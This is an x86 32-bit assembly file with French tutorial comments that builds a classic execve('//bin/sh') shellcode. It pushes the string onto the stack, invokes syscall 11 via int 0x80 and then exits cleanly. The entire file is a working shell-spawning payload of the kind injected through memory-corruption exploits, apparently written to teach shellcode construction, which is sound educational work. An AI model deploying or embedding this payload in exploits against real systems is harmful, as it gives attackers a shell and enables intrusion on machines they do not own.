bits 32

shellcode:
    ; On réinitialise les registres
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    ; Appel système 11
    mov al, 11

    ; ebx doit contenir un pointeur vers //bin/sh
    ; donc on construit la chaîne sur la pile

    push ebx ; ebx = 0, donc on a notre null-byte
    push `n/sh`
    push `//bi`

    ; A ce moment là, esp pointe sur `//bin/sh\0`
    mov ebx, esp ; on met dans ebx l'adresse de notre chaîne.

    ; ecx et edx valent déjà zéro (NULL)
    ; donc nous sommes tranquilles :)

    ; On exécute l'appel système
    int 0x80

    ; Et on quitte proprement
    ; (cf. shellcode Hello World)
    mov al, 1
    xor ebx, ebx
    int 0x80
